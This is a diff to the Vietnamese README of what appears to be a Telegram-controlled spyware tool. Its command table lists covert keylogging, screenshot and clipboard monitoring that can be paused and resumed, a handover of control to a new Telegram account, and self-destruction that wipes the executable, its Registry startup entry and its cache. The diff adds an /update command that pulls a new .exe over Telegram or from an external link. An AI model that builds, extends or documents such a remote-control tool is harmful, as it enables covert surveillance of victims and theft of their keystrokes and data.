@@ -87,6 +87,7 @@ Bạn có thể gửi lệnh trực tiếp hoặc bấm qua Menu ở góc trái 
 | `/pause` | Tạm dừng các hoạt động giám sát ngầm (keylog, chụp màn hình, kiểm tra clipboard) nhưng vẫn giữ kết nối nhận lệnh Telegram. | `/pause` hoặc `/pause @Tên_Máy` |
 | `/resume` | Tiếp tục (chạy lại) các hoạt động giám sát ngầm đã bị tạm dừng. | `/resume` hoặc `/resume @Tên_Máy` |
 | `/auth` | Chuyển quyền điều khiển tool sang tài khoản Telegram mới nếu tài khoản cũ bị khóa (die). | `/auth <secret_key>` |
+| `/update` | Cập nhật file `.exe` phiên bản mới từ Telegram hoặc tải về trực tiếp từ link lưu trữ ngoài. | Đính kèm file với caption: <code>/update @Tên_Máy</code> hoặc gửi lệnh: <code>/update &lt;direct_link&gt; @Tên_Máy</code> |
 | `/destruct` | Kích hoạt tự hủy tool, xóa sạch file chạy, Registry Startup và thư mục Cache lưu trữ. | `/destruct` hoặc `/destruct @Tên_Máy` |
 | `/help` | Hiển thị bảng hướng dẫn sử dụng chi tiết này. | `/help` hoặc `/help @Tên_Máy` |
 
